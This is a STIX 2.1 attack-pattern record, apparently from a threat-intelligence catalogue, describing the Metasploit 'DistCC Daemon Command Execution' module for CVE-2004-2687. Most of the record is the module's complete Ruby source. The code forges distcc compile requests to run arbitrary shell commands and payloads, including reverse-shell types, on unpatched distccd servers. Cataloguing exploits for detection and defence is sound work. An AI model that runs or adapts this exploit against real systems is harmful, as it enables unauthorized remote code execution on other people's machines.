{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6fb755cb-463b-4ca6-8f90-b64bea7ea2f7",
    "created": "2024-08-14T17:14:15.371673Z",
    "modified": "2024-08-14T17:14:15.371677Z",
    "name": "DistCC Daemon Command Execution",
    "description": " This module uses a documented security weakness to execute arbitrary commands on any system running distccd.  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/misc/distcc_exec.rb",
            "external_id": "distcc_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-2687"
        },
        {
            "source_name": "reference",
            "url": "http://distcc.samba.org/security.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'DistCC Daemon Command Execution',\n      'Description'    => %q{\n        This module uses a documented security weakness to execute\n        arbitrary commands on any system running distccd.\n\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2004-2687'],\n          [ 'OSVDB', '13378' ],\n          [ 'URL', 'http://distcc.samba.org/security.html'],\n\n        ],\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'       => 1024,\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd cmd_bash',\n              'RequiredCmd' => 'generic perl ruby bash telnet openssl bash-tcp',\n            }\n        },\n      'Targets'        =>\n        [\n          [ 'Automatic Target', { }]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2002-02-01'\n      ))\n\n      register_options(\n        [\n          Opt::RPORT(3632)\n        ])\n  end\n\n  def check\n    r = rand_text_alphanumeric(10)\n    connect\n    sock.put(dist_cmd(\"sh\", \"-c\", \"echo #{r}\"))\n\n    dtag = rand_text_alphanumeric(10)\n    sock.put(\"DOTI0000000A#{dtag}\\n\")\n\n    err, out = read_output\n    if out && out.index(r)\n      return Exploit::CheckCode::Vulnerable\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect\n\n    distcmd = dist_cmd(\"sh\", \"-c\", payload.encoded);\n    sock.put(distcmd)\n\n    dtag = rand_text_alphanumeric(10)\n    sock.put(\"DOTI0000000A#{dtag}\\n\")\n\n    err, out = read_output\n\n    (err || \"\").split(\"\\n\") do |line|\n      print_status(\"stderr: #{line}\")\n    end\n    (out || \"\").split(\"\\n\") do |line|\n      print_status(\"stdout: #{line}\")\n    end\n\n    handler\n    disconnect\n  end\n\n  def read_output\n\n    res = sock.get_once(24, 5)\n\n    if !(res and res.length == 24)\n      print_status(\"The remote distccd did not reply to our request\")\n      disconnect\n      return\n    end\n\n    # Check STDERR\n    res = sock.get_once(4, 5)\n    res = sock.get_once(8, 5)\n    len = [res].pack(\"H*\").unpack(\"N\")[0]\n\n    return [nil, nil] if not len\n    if (len > 0)\n      err = sock.get_once(len, 5)\n    end\n\n    # Check STDOUT\n    res = sock.get_once(4, 5)\n    res = sock.get_once(8, 5)\n    len = [res].pack(\"H*\").unpack(\"N\")[0]\n\n    return [err, nil] if not len\n    if (len > 0)\n      out = sock.get_once(len, 5)\n    end\n    return [err, out]\n\n  end\n\n\n  # Generate a distccd command\n  def dist_cmd(*args)\n\n    # Convince distccd that this is a compile\n    args.concat(%w{# -c main.c -o main.o})\n\n    # Set distcc 'magic fairy dust' and argument count\n    res = \"DIST00000001\" + sprintf(\"ARGC%.8x\", args.length)\n\n    # Set the command arguments\n    args.each do |arg|\n      res << sprintf(\"ARGV%.8x%s\", arg.length, arg)\n    end\n\n    return res\n  end\nend\n",
    "x_mitre_disclosure_date": "2002-02-01",
    "x_mitre_platforms": [
        "['unix']"
    ]
}